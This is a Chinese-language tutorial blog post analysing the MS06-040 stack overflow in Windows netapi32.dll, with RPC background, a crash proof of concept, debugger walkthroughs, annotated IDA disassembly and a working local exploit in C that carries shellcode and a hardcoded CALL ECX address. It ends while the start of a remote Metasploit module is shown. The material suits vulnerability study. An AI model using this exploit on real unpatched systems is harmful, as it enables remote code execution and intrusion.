    <content type="html"><![CDATA[<p>[toc]</p><h1 id="rpc-漏洞"><a class="markdownIt-Anchor" href="#rpc-漏洞"></a> RPC 漏洞</h1><h2 id="rpc-漏洞简介"><a class="markdownIt-Anchor" href="#rpc-漏洞简介"></a> RPC 漏洞简介</h2><p>RPC 即 Remote Procedure Call，它是一种计算机进程间的通信方式。简单地说，RPC 就是让您在自己地程序中调用一个函数（可能需要很大地计算量），而这个函数在另外一个或多个远程机器上执行，执行完后将结果传回您的机器进行后续操作。</p><p>RPC漏洞，远程调用函数出现了问题，甚至有可被利用的安全漏洞。</p><h2 id="rpc编程简介"><a class="markdownIt-Anchor" href="#rpc编程简介"></a> RPC编程简介</h2><p>在 VC 中进行 RPC 调用的流程如下图所示。</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220713220518781.png" alt="image-20220713220518781"><p>使用 RPC 调用时首先应当定义远程进程的接口 IDL 文件。 IDL（ Interface Description Language）是专门用来定义接口的语言，在这个文件里我们要指定 RPC 的接口信息以及 interface 下的 function 信息，包括函数的声明，参数等。</p><p>微软的 IDL 叫做 MIDL， 是兼容 IDL 标准的。定义好的 IDL 文件接口经过微软的 MIDL 编译器编译后会生成 3 个文件，一个客户端 stub（有些文献把 stub 翻译成“插桩”或“码桩”），一个服务端 stub，还有一个 RPC 调用的头文件。其中 stub 负责 RPC 调用过程中所有的网络操作细节。</p><p>在本章中将会用到 MS06-040 所需的接口文件，您可在看雪相关板块中下载附件。用 MIDL 编译接口文件rpc_exploit_040.acf 和 rpc_exploit_040.idl，得到 stub 文件和头文件。MIDL 编译器在 VC6.0 的组件里，可以在命令行下使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">midl /acf rpc_exploit_040.acf rpc_exploit_040.idl</span><br></pre></td></tr></table></figure><p>编译成功后，会在当前路径生成 3 个文件：<br>（ 1） rpc_exploit_040_s.c RPC 服务端 stub（桩）<br>（ 2） rpc_exploit_040_c.c R PC 客户端 stub（桩）<br>（ 3） rpc_exploit_040.h RPC 头文件</p><p>把两个 stub 添加进工程， include 头文件，和调用远程函数的程序一起 link，您就可以试着<br>去调用远程主机上的函数了。</p><h1 id="ms06-040"><a class="markdownIt-Anchor" href="#ms06-040"></a> MS06-040</h1><h2 id="ms06-040-简介"><a class="markdownIt-Anchor" href="#ms06-040-简介"></a> MS06-040 简介</h2><p>MS06-040 是这个漏洞的微软编号，其 CVE 编号为 CVE-2006-3439，对应补丁号为KB921883。</p><p>几乎所有使用 socket 网络的程序都会加载负责网络操作的 netapi32.dll。 MS06-040 指的就是这个动态链接库中的导出函数 NetpwPathCanonicalize() 中存在的缓冲溢出缺陷，而NetpwPathCanonicalize() 函数又可以被 RPC 远程调用，所以才会有这么大的危害。</p><h3 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h3><p>NetpwPathCanonicalize()是 netapi32.dll 的一个导出函数，用于格式化网络路径字符串，它的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">NetpwPathCanonicalize</span> <span class="params">(</span></span><br><span class="line"><span class="params">uint16      path[ ],            <span class="comment">//[in]      path name</span></span></span><br><span class="line"><span class="params">uint8       can_path[ ],        <span class="comment">//[out]     canonicalizedpath</span></span></span><br><span class="line"><span class="params">uint32      maxbuf,             <span class="comment">//[in]      max size of can_path</span></span></span><br><span class="line"><span class="params">uint16      prefix[ ],          <span class="comment">//[in]      path prefix</span></span></span><br><span class="line"><span class="params">uint32*     pathtype,           <span class="comment">//[in out]  path type</span></span></span><br><span class="line"><span class="params">uint32      pathflags           <span class="comment">//[in]      path flags, 0 or 1</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>这是一个 Unicode 字符串处理函数，大体功能是：如果 prefix 串非空，将 prefix 串与 path串用‘ \’相连，并复制到输出串 can_path 中，输出串的容量为 maxbuf 字节大小：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prefix ＋ ‘\’ ＋ path =&gt; can_path [max_buf]</span><br></pre></td></tr></table></figure><p>在路径合并过程中，函数会做各种检查，如 prefix 或 path 长度是否越界、是否符合路径规范，或 can_path 的容量是否够大等等，否则函数将退出，并返回相应的错误号，例如，ERROR_INVALID_NAME （ 0x7B ）， ERROR_INVALID_PARAMETER （ 0x135 ），NERR_BufTooSmall（ 0x84B）等；函数成功则返回 0，并对 pathtype 进行更新。</p><p>首先在本地直接装载有漏洞的动态链接库，并调用这个函数，等到弄清楚栈中的细节之后，再实践远程利用。</p><p>触发这个漏洞的 POC 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">    <span class="type">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">    <span class="type">int</span> maxbuf = <span class="number">0x440</span>;</span><br><span class="line">    <span class="type">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">long</span> pathtype = <span class="number">44</span>;</span><br><span class="line"> </span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[] = <span class="string">&quot;./netapi32.dll&quot;</span>;</span><br><span class="line">    <span class="type">char</span> VulFunc[] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">    <span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="keyword">sizeof</span>(path));</span><br><span class="line">    <span class="built_in">memset</span>(path, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(path) - <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memset</span>(prefix, <span class="number">0</span>, <span class="keyword">sizeof</span>(prefix));</span><br><span class="line">    <span class="built_in">memset</span>(prefix, <span class="string">&#x27;b&#x27;</span>, <span class="keyword">sizeof</span>(prefix) - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    (Trigger)(path, can_path, maxbuf, prefix, &amp;pathtype, <span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的功能是装载存在漏洞的 netapi32.dll，并调用其导出函数 NetpwPathCanonicalize。在函数调用时我们将 path 和 prefix 设置成很长的字符串，用以触发栈溢出。注意这个字符串以两个字节的 null 结束，这是因为 NetpwPathCanonicalize 将按照 Unicode 来处理字符串。</p><p>memset()函数，将缓冲区设置为指定字符。</p><table><thead><tr><th></th><th>推荐的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>winXP SP3</td><td>本地调试与操作系统版本无关</td></tr><tr><td>漏洞文件</td><td>netapi32.dll</td><td>在没有 patch 过 KB921883 的 Window 2000 操作系统中，该文件位于 c:\winnt\system32 下 ； 若操作系统已经被 patch ， 可 以在 c:\winnt$NtUninstallKB921883$下找到该文件；您也可以在本章的附带资料中找到这个动态链接库文件</td></tr><tr><td>编译器</td><td>VC++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>Release 版本</td><td>debug 版本在调试时可能会有细节上的差异</td></tr></tbody></table><blockquote><p>注意： 需要未打补丁的netapi32.dll，Windows 2000在C:\WINNT\system32目录下能找到，或者用以下提供的dll，但远程exploit必须要带有未打补丁dll的系统。本实验指导的调试基于使用的漏洞文件大小为 309008 字节，您可以在本章附带的电子资料中找到这个文件，请您在编译运行 POC 代码时将这个漏洞文件放在工程的相同路径下。</p></blockquote><blockquote><p>netapi32.dll 下载链接:<a href="https://pan.baidu.com/s/1qZQ1vnY">https://pan.baidu.com/s/1qZQ1vnY</a>  密码:5stq</p></blockquote><h4 id="定位程序崩溃点"><a class="markdownIt-Anchor" href="#定位程序崩溃点"></a> 定位程序崩溃点</h4><p>编译运行后，系统会提示出错，直接点调试。进入OD后，按 F9 运行到程序崩溃处，可以看到 EBP 和 EIP 都被覆盖为 “aaaa”。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714123823178-16577739716151.png" alt="image-20220714123823178"></p><p>重新加载程序，调试来到 call netapi32.NetpwPathCanonicalize 处。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714124834735.png" alt="image-20220714124834735"></p><p>进入 NetpwPathCanonicalize() 函数体后，按 “F8” 键继续单步跟踪。程序将在另一次函数调用时崩溃。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714132056431.png" alt="image-20220714132056431"></p><p>重新加载，“F7” 继续跟进，最后发现，在函数返回前 pop ebx 中，向栈中压入了大量 b 充当无效数据，导致在 retn 时，返回地址错误，发生崩溃。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714125708003.png" alt="image-20220714125708003"></p><h4 id="构造exploit"><a class="markdownIt-Anchor" href="#构造exploit"></a> 构造exploit</h4><p>反复跟踪后溢出函数后，发现这段程序首先将 prefix 所指的字符串“ bbbbbb……” 复制到栈中，然后在这个字符串后加上 Unicode 字符“\”（ 0x5C00），再将 path 中的长字符串“ aaaa……”连接在末尾，而正是连接 path 串的 wcscat 调用触发了漏洞。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714133733738.png" alt="image-20220714133733738"></p><p>程序“跑飞”之前的系统状态。<br>（ 1） prefix 串中包含了 0xFE 个字符‘b’（ 0x62），被复制到栈帧中开始于 0x0012F240 处的缓冲区。<br>（ 2）程序在 prefix 的末尾连接上 Unicode 字符‘ \’（ 0x005C）。<br>（ 3）程序在‘ \’后连接 0x31E 个字符‘ a’（ 0x61），这次字符串连接操作造成了栈帧溢出，位于 0x0012F654 处的 EBP 及紧随其后的返回地址都被改写。(图26.2.6地址与本次实验地址不同)</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717224801801.png" alt="image-20220717224801801"></p><p>ECX 在函数返回时总是指向栈中缓冲区，因此我们可以把 shellcode 放在 prefix 串中，并采用JMP ECX 作为定位 shellcode 的跳板。用 OllyDbg 在内存中搜索指令 JMP ECX。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714152047332.png" alt="image-20220714152047332"></p><p>用 netapi32.dll 自身代码空间中 0x751852F9 处的 CALL ECX 作为跳转指令。</p><p>布置缓冲区如下。<br>（ 1）缓冲区中的内容为： (prefi x:bbb …) +（ \） +（ path: aaa…）。<br>（ 2）目前 prefix 串大小为 0x100（ 256）字节，除去两个字节 null 作为结束符， 254 字节基本能够容纳 shellcode。<br>（ 3）缓冲区起址： 0x0012F240。<br>（ 4） EBP 位置： 0x0012F654。<br>（ 5）返回地址： 0x0012F240。<br>（ 6）返回地址距离缓冲区的偏移为： 0x0012F654-0x0012F240=0x418，去掉 prefix 和 ‘ \’ 的影响， path 串偏移 0x418-0x100=0x318 处的 DWORD 将淹没返回地址，在那里填入跳转地址即可执行 shellcode。</p><p>仍然使用弹出“ failwest”消息框的 shellcode 进行测试，最终的本地溢出利用代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">    <span class="type">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">    <span class="type">int</span> maxbuf=<span class="number">0x440</span>;</span><br><span class="line">    <span class="type">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">long</span> pathtype=<span class="number">44</span>;</span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[] = <span class="string">&quot;./netapi32.dll&quot;</span>; <span class="comment">// care for the path</span></span><br><span class="line">    <span class="type">char</span> VulFunc[] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">    <span class="built_in">memset</span>(path,<span class="number">0</span>,<span class="keyword">sizeof</span>(path));</span><br><span class="line">    <span class="built_in">memset</span>(path,<span class="number">0x90</span>,<span class="keyword">sizeof</span>(path)<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">memset</span>(prefix,<span class="number">0</span>,<span class="keyword">sizeof</span>(prefix));</span><br><span class="line">    <span class="built_in">memset</span>(prefix,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">sizeof</span>(prefix)<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(prefix,shellcode,<span class="number">168</span>);</span><br><span class="line">    path[<span class="number">0x318</span>]=<span class="number">0xF9</span>;<span class="comment">// address of CALL ECX</span></span><br><span class="line">    path[<span class="number">0x319</span>]=<span class="number">0x52</span>;</span><br><span class="line">    path[<span class="number">0x31A</span>]=<span class="number">0x18</span>;</span><br><span class="line">    path[<span class="number">0x31B</span>]=<span class="number">0x75</span>;</span><br><span class="line">    (Trigger)(path,can_path,maxbuf,prefix,&amp;pathtype,<span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行，就能看到 failwest 消息框了。</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714153344604.png" alt="image-20220714153344604" style="zoom: 50%;"><p>总结一下动态调试的思路。<br>（ 1）第一次调试看到 EIP 已经被改写为 0x61616161，证明传入的参数可以制造溢出并控制EIP，但堆栈被破坏，无法看到溢出前的函数调用。<br>（ 2）跟踪调试，找到 NetpwPathCanonicalize 的 VA 地址，直接对这个 VA 地址下断点。<br>（ 3）单步跟踪 NetpwPathCanonicalize 函数，观察寄存器的变化，发现是其中的一次函数调用引起的错误。<br>（ 4）第三次调试直接针对 NetpwPathCanonicalize 中引起错误的子函数，单步跟踪一轮后，彻底弄清楚栈中布局，编写本地 exploit。</p><h2 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h2><p>通过 IDA 加载 netapi32.dll，找到漏洞的缺陷代码，NetpwPathCanonicalize 函数中的 CanoicalizePathName 函数，如下图黄色框内。</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714223348998.png" alt="image-20220714223348998"><p>在动态调试时，我们已经知道产生溢出的函数实际上是 0x7517F856 处调用的的子函数 CanonicalizePathName()， prefix 串与 path 串的合并操作就位于其中，该函数的声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CanonicalizePathName</span> <span class="params">(</span></span><br><span class="line"><span class="params">    uint16 prefix[ ], <span class="comment">// [in] path prefix</span></span></span><br><span class="line"><span class="params">    uint16path[ ], <span class="comment">// [in] path name</span></span></span><br><span class="line"><span class="params">    uint8 can_path[ ], <span class="comment">// [out] canonicalized path</span></span></span><br><span class="line"><span class="params">    uint32 maxbuf, <span class="comment">// [in] max byte size of can_path</span></span></span><br><span class="line"><span class="params">    uint32 can_size <span class="comment">// [in out] byte size of can_path</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>用 IDA 重点看一下这个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">; =============== S U B R O U T I N E ===============================</span><br><span class="line">; int   stdcall CanonicalizePathName(wchar_t *, wchar_t *, wchar_t*, int, int)</span><br><span class="line">7517FC68 CanonicalizePathName proc near</span><br><span class="line">7517FC68</span><br><span class="line">7517FC68 Buff_last_word  = word ptr -416h</span><br><span class="line">7517FC68 Buff_OF         = word ptr -414h</span><br><span class="line">7517FC68 arg_Prefix      = dword ptr  8</span><br><span class="line">7517FC68 arg_Path        = dword ptr  0Ch</span><br><span class="line">7517FC68 arg_CanPath     = dword ptr  10h</span><br><span class="line">7517FC68 arg_Maxbuf      = dword ptr  14h</span><br><span class="line">7517FC68 arg_CanSize     = dword ptr  18h</span><br><span class="line">7517FC68</span><br><span class="line">7517FC68 push   ebp</span><br><span class="line">7517FC69 mov    ebp, esp</span><br><span class="line">7517FC6B sub esp, 414h ; 分配 0x414 字节栈空间，即 Buff_OF，用来</span><br><span class="line">; 存储合并路径(prefix+’\’+path)</span><br><span class="line">7517FC71 push ebx</span><br><span class="line">7517FC72 push esi</span><br><span class="line">7517FC73 xor esi, esi</span><br><span class="line">7517FC75 push edi</span><br><span class="line">7517FC76 cmp [ebp+arg_Prefix], esi</span><br><span class="line">7517FC79 mov edi, ds:__imp_wcslen</span><br><span class="line">7517FC7F mov ebx, 411h ; ebx 始终等于 0x411，用于检查越界（字节）</span><br><span class="line">; 长度</span><br><span class="line">7517FC84 jz short @@prefix_ptr_zero</span><br><span class="line">7517FC86 push [ebp+arg_Prefix]</span><br><span class="line">7517FC89 call edi ; __imp_wcslen</span><br><span class="line">                        ; 计算 prefix 串的 Unicode 长度，注意为字</span><br><span class="line">                        ; 节长度的一半，这是导致边界检查被突破的根</span><br><span class="line">                        ; 本原因，即用 Unicode 检查边界，而栈空间</span><br><span class="line">                        ; 是按字节开的</span><br><span class="line">7517FC8B mov esi, eax ; esi 始终记录 prefix 串的 Unicode 长度</span><br><span class="line">7517FC8D pop ecx</span><br><span class="line">7517FC8E test esi, esi</span><br><span class="line">7517FC90 jz short @@chk_pathname</span><br><span class="line">7517FC92 cmp esi, ebx ; prefix 是否大于 0x411</span><br><span class="line">7517FC94 ja @@err_invalid_name</span><br><span class="line">; 若越界，则退出程序</span><br><span class="line">7517FC9A push [ebp+arg_Prefix]</span><br><span class="line">7517FC9D lea eax, [ebp+Buff_OF]</span><br><span class="line">7517FCA3 push eax</span><br><span class="line">7517FCA4 call ds:__imp_wcscpy</span><br><span class="line">                        ; 将 prefix 串写入栈空间 Buff_OF 暂存。虽然前</span><br><span class="line">                        ; 面的边界检查有缺陷，似乎实际可以传入的 prefix</span><br><span class="line">                        ; 串可以达到 0x822 字节，但是在传入本函数前,</span><br><span class="line">                        ; prefix 串已被 NetpwPathType()检查过，其长度</span><br><span class="line">                        ; 不能超过 0x206 字节，所以光靠这里的检查缺陷</span><br><span class="line">                        ; 还不足以通过 prefix 串制造溢出</span><br><span class="line">…</span><br><span class="line">7517FCED @@prefix_ptr_zero:</span><br><span class="line">7517FCED mov [ebp+Buff_OF], si</span><br><span class="line">7517FCF4 @@chk_pathname:</span><br><span class="line">7517FCF4 push [ebp+arg_Path]</span><br><span class="line">7517FCF7 call edi ; __imp_wcslen</span><br><span class="line">; 计算 path 串的 Unicode 长度</span><br><span class="line">7517FCF9 add eax, esi ; 合并前，计算合并路径(prefix+’\’+path)的</span><br><span class="line">; Unicode 长度</span><br><span class="line">7517FCFB pop ecx</span><br><span class="line">7517FCFC cmp eax, ebx ; 第二次边界检查，仍然将 Unicode 字符长度与</span><br><span class="line">; 字节长度 0x411 进行比较</span><br><span class="line">7517FCFE ja short @@err_invalid_name</span><br><span class="line">                        ; 从前面的分析可以知道，只靠 prefix 串是无法</span><br><span class="line">                        ; 制造溢出的，但是 path 串的传入没有任何限制，</span><br><span class="line">                        ; 所以可以通过增加 path 串的长度溢出。栈空间</span><br><span class="line">                        ; 为 0x414，我们实际可以传入的串总长可以达到</span><br><span class="line">                        ; 或或超过 0x828</span><br><span class="line">7517FD00 push [ebp+arg_Path]</span><br><span class="line">7517FD03 lea eax, [ebp+Buff_OF]</span><br><span class="line">7517FD09 push eax</span><br><span class="line">7517FD0A call ds:__imp_wcscat ; 将 path 串继续连入 Buff_OF，生成最终</span><br><span class="line">                                ; 的合并路径，这个调用导致了最终的栈溢出</span><br><span class="line">…</span><br><span class="line">7517FD3E @@err_invalid_name:</span><br><span class="line">7517FD3E push ERROR_INVALID_NAME</span><br><span class="line">7517FD40 pop eax</span><br><span class="line">7517FD41 jmp short @@quit</span><br><span class="line">…</span><br><span class="line">7517FD7A @@quit:</span><br><span class="line">7517FD7A pop edi</span><br><span class="line">7517FD7B pop esi</span><br><span class="line">7517FD7C pop ebx</span><br><span class="line">7517FD7D leave</span><br><span class="line">7517FD7E retn 14h</span><br><span class="line">7517FD7E CanonicalizePathName endp</span><br><span class="line">; =============== S U B R O U T I N E ===============================</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>两次边界检查的限制都是 Unicode 长度不能超过 0x411，换算成字节长度就是 0x822，而栈空间的大小是按字节开的 0x414。按照 ASCII 字符开辟空间，按照 Unicode 字符来检查边界是漏洞的根本原因。<br>依据以上的溢出原理，只要设计好 prefix 串和 path 串的长度，调用 NetpwPath Canonicalize 函数即可发生栈溢出。</p><h2 id="实现远程-exploit"><a class="markdownIt-Anchor" href="#实现远程-exploit"></a> 实现远程 exploit</h2><p>进行 RPC 调用的代码框架：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote</span><br><span class="line">  Rank = GoodRanking</span><br><span class="line"> </span><br><span class="line">    include Msf::Exploit::Remote::DCERPC</span><br><span class="line">    include Msf::Exploit::Remote::SMB::Client                     </span><br><span class="line">end</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">        <span class="built_in">super</span>(update_info(info,</span><br><span class="line">            <span class="string">&#x27;Name&#x27;</span>     =&gt; <span class="string">&#x27;MS06-040 Remote overflow POC &#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Platform&#x27;</span>  =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Targets&#x27;</span>   =&gt; [[<span class="string">&#x27;Windows 